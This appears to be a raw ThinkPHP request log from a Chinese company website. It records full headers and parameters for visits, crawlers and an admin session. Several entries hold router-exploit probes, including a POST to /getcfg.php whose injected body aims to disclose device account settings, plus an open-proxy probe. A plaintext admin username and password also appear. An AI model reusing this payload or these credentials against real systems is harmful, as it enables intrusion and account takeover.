[ 2018-01-04T00:20:27+08:00 ] 172.17.195.153 59.110.6.177 GET /
[ log ] 39.104.9.52:80/ [运行时间：0.023993s][吞吐率：41.68req/s] [内存消耗：2,778.28kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.9.52:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T03:55:57+08:00 ] 172.17.195.153 159.89.40.4 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.024594s][吞吐率：40.66req/s] [内存消耗：2,778.96kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.xinchumenye.com',
  'accept-charset' => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
  'user-agent' => 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)',
  'accept-encoding' => 'identity',
  'accept' => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-language' => 'en-gb,en;q=0.5',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T04:08:56+08:00 ] 172.17.195.153 187.66.42.70 GET /hndUnblock.cgi
[ log ] 39.106.4.226/hndUnblock.cgi [运行时间：0.011461s][吞吐率：87.25req/s] [内存消耗：1,508.55kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hndUnblock.cgi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T04:09:00+08:00 ] 172.17.195.153 187.66.42.70 GET /tmUnblock.cgi
[ log ] 39.106.4.226/tmUnblock.cgi [运行时间：0.011925s][吞吐率：83.86req/s] [内存消耗：1,508.59kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'tmUnblock.cgi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T04:09:05+08:00 ] 172.17.195.153 187.66.42.70 GET /moo
[ log ] 39.106.4.226/moo [运行时间：0.011900s][吞吐率：84.03req/s] [内存消耗：1,508.52kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'moo',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T04:09:10+08:00 ] 172.17.195.153 187.66.42.70 GET /
[ log ] 39.106.4.226/ [运行时间：0.024539s][吞吐率：40.75req/s] [内存消耗：2,778.61kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T04:09:14+08:00 ] 172.17.195.153 187.66.42.70 POST /getcfg.php
[ log ] 39.106.4.226/getcfg.php [运行时间：0.011013s][吞吐率：90.80req/s] [内存消耗：1,508.39kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'getcfg.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'cookie' => 'uid=Zd5iHiPget',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '60',
)
[ info ] [ PARAM ] array (
  'A' => 'A
_POST_SERVICES=DEVICE.ACCOUNT
AUTHORIZED_GROUP=1',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T04:09:20+08:00 ] 172.17.195.153 187.66.42.70 POST /getcfg.php
[ log ] 39.106.4.226/getcfg.php [运行时间：0.011190s][吞吐率：89.37req/s] [内存消耗：1,508.39kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'getcfg.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'cookie' => 'uid=Zd5iHiPget',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '60',
)
[ info ] [ PARAM ] array (
  'A' => 'A
_POST_SERVICES=DEVICE.ACCOUNT
AUTHORIZED_GROUP=1',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:21:26+08:00 ] 172.17.195.153 34.248.68.154 GET /
[ log ] xinchumenye.com/ [运行时间：0.025435s][吞吐率：39.32req/s] [内存消耗：2,778.30kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'xinchumenye.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:21:26+08:00 ] 172.17.195.153 34.248.68.154 GET /index/index/contact.html
[ log ] xinchumenye.com/index/index/contact.html [运行时间：0.020359s][吞吐率：49.12req/s] [内存消耗：2,745.70kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'contact',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'xinchumenye.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->contact[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/contact.html [ array (
  0 => 'lunbo',
  1 => 'link',
  2 => 'profile',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:21:28+08:00 ] 172.17.195.153 34.248.68.154 GET /index/index/news.html
[ log ] xinchumenye.com/index/index/news.html [运行时间：0.022422s][吞吐率：44.60req/s] [内存消耗：2,818.28kb] [文件加载：53]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'news',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'xinchumenye.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->news[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/news.html [ array (
  0 => 'lunbo',
  1 => 'link',
  2 => 'news',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:21:29+08:00 ] 172.17.195.153 34.248.68.154 GET /index/index/index.html
[ log ] xinchumenye.com/index/index/index.html [运行时间：0.023754s][吞吐率：42.10req/s] [内存消耗：2,778.66kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'xinchumenye.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:21:31+08:00 ] 172.17.195.153 34.248.68.154 GET /index/index/enjoy.html
[ log ] xinchumenye.com/index/index/enjoy.html [运行时间：0.022244s][吞吐率：44.96req/s] [内存消耗：2,765.58kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'enjoy',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'xinchumenye.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->enjoy[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/enjoy.html [ array (
  0 => 'lunbo',
  1 => 'series',
  2 => 'link',
  3 => 'xilie1',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:21:32+08:00 ] 172.17.195.153 34.248.68.154 GET /index/index/news.html?page=1
[ log ] xinchumenye.com/index/index/news.html?page=1 [运行时间：0.020441s][吞吐率：48.92req/s] [内存消耗：2,819.24kb] [文件加载：53]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'news',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'xinchumenye.com',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ RUN ] app\index\controller\Index->news[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/news.html [ array (
  0 => 'lunbo',
  1 => 'link',
  2 => 'news',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:21:33+08:00 ] 172.17.195.153 34.248.68.154 GET /index/index/enjoy.html?category=%E5%8F%8D%E5%87%B9%E5%87%B8%E7%B3%BB%E5%88%97
[ log ] xinchumenye.com/index/index/enjoy.html?category=%E5%8F%8D%E5%87%B9%E5%87%B8%E7%B3%BB%E5%88%97 [运行时间：0.022186s][吞吐率：45.07req/s] [内存消耗：2,766.21kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'enjoy',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'xinchumenye.com',
)
[ info ] [ PARAM ] array (
  'category' => '反凹凸系列',
)
[ info ] [ RUN ] app\index\controller\Index->enjoy[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/enjoy.html [ array (
  0 => 'lunbo',
  1 => 'series',
  2 => 'link',
  3 => 'xilie1',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:28:09+08:00 ] 172.17.195.153 106.11.242.40 GET /
[ log ] xinchumenye.com/ [运行时间：0.025085s][吞吐率：39.86req/s] [内存消耗：2,778.77kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'host' => 'xinchumenye.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T07:45:19+08:00 ] 172.17.195.153 94.102.49.174 GET http://www.baidu.com/cache/global/img/gs.gif
[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011528s][吞吐率：86.75req/s] [内存消耗：1,508.71kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T08:29:40+08:00 ] 172.17.195.153 114.215.45.79 GET /
[ log ] 39.104.1.94:80/ [运行时间：0.024699s][吞吐率：40.49req/s] [内存消耗：2,778.29kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.1.94:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:00+08:00 ] 172.17.195.153 111.8.130.80 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.023797s][吞吐率：42.02req/s] [内存消耗：2,779.45kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.xinchumenye.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'Huiskin=blue',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:16+08:00 ] 172.17.195.153 111.8.130.80 GET /admin
[ log ] www.xinchumenye.com/admin [运行时间：0.012811s][吞吐率：78.06req/s] [内存消耗：1,929.84kb] [文件加载：47]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.xinchumenye.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'Huiskin=blue',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:17+08:00 ] 172.17.195.153 111.8.127.80 GET /admin/login/index.html
[ log ] www.xinchumenye.com/admin/login/index.html [运行时间：0.013530s][吞吐率：73.91req/s] [内存消耗：1,890.28kb] [文件加载：45]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Login->index[ /webdata/application/admin/controller/Login.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ VIEW ] /webdata/application/admin/view/login/index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:25+08:00 ] 172.17.195.153 111.8.130.80 POST /admin/login/index.html
[ log ] www.xinchumenye.com/admin/login/index.html [运行时间：0.020202s][吞吐率：49.50req/s] [内存消耗：3,007.80kb] [文件加载：55]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/login/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '100',
)
[ info ] [ PARAM ] array (
  'username' => 'xinchumenye',
  'password' => 'xinchumenye123',
)
[ info ] [ RUN ] app\admin\controller\Login->index[ /webdata/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ VIEW ] /webdata/thinkphp/tpl/dispatch_jump.tpl [ array (
  0 => 'code',
  1 => 'msg',
  2 => 'data',
  3 => 'url',
  4 => 'wait',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:28+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/index/index.html
[ log ] www.xinchumenye.com/admin/index/index.html [运行时间：0.014710s][吞吐率：67.98req/s] [内存消耗：2,183.79kb] [文件加载：48]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/login/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Index->index[ /webdata/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /webdata/application/admin/view/index/index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:28+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/index/welcome.html
[ log ] www.xinchumenye.com/admin/index/welcome.html [运行时间：0.014457s][吞吐率：69.17req/s] [内存消耗：2,103.66kb] [文件加载：46]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'welcome',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Index->welcome[ /webdata/application/admin/controller/Index.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:31+08:00 ] 172.17.195.153 111.8.127.80 GET /admin/category/add.html
[ log ] www.xinchumenye.com/admin/category/add.html [运行时间：0.021387s][吞吐率：46.76req/s] [内存消耗：3,126.57kb] [文件加载：57]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'category',
    2 => 'add',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, image/jxr, */*',
  'referer' => 'http://www.xinchumenye.com/admin/index/index.html',
  'accept-language' => 'zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.xinchumenye.com',
  'connection' => 'Keep-Alive',
  'cookie' => 'Huiskin=blue; PHPSESSID=r32s4109tip1qievsh83nhpc46',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Category->add[ /webdata/application/admin/controller/Category.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/admin/view/category/add.html [ array (
  0 => 'categorys',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-01-04T10:32:33+08:00 ] 172.17.195.153 111.8.130.80 GET /admin/deal/apply.html
